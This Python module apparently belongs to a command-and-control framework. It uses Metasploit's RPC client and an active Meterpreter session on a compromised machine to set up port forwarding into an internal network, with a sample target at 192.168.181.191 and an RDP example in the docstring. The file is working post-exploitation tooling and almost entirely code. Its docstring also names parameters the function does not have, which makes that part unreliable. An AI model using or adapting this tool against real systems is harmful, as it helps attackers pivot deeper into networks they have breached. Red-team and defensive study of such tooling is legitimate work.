# todo
""" 
meterpreter> portfwd add -l 3389 -p 3389 -r 10.10.10.2 
The example above sets up a RDP port to target 10.10.10.2 
with an active meterpreter session
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
     -L >opt>  The local host to listen on (optional).
     -h        Help banner.
     -l >opt>  The local port to listen on.
     -p >opt>  The remote port to connect on.
     -r >opt>  The remote host to connect on.
"""
from c2_settings import MSF_SERVER, MSF_PWD
from pymetasploit.msfrpc import MsfRpcClient
from time import sleep


def run(client, SESSION, LOCALPORT, REMOTEPORT, TARGET, CMD='add', wait_sec=300):
    """
    Setup port-forwarding with an active Meterpreter session
    \n:param client: MsfRpcClient object
    \n:param SESSION: numeric session id
    \n:param NETMASK: Netmask eg. IPv4 as "255.255.255.0" or CIDR as "/24"
    \n:param SUBNET: Subnet (IPv4, for example, 10.10.10.0)
    \n:param CMD: add, *autoadd, print, delete, default
    \n:return type: str result from command
    """

    shell = client.sessions.session(SESSION)
    if 'MeterpreterSession' not in str(type(shell)):
        return 'Need a Meterpreter session'
    cmd = 'portfwd {0} -l {1} -p {2} -r {3}\n'.format(CMD, LOCALPORT, REMOTEPORT, TARGET)
    shell.write(cmd)
    while wait_sec > 0:
        sleep(3)
        r = shell.read()
        if '[' in r:
            return r
        wait_sec -= 3

if __name__ == '__main__':
    client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
    from stage2.external_c2 import msf_wait_for_session
    id = msf_wait_for_session.run(client)
    print('got session id ' + str(id))
    print(run(client,id,8000,8000,'192.168.181.191','add'))
    
                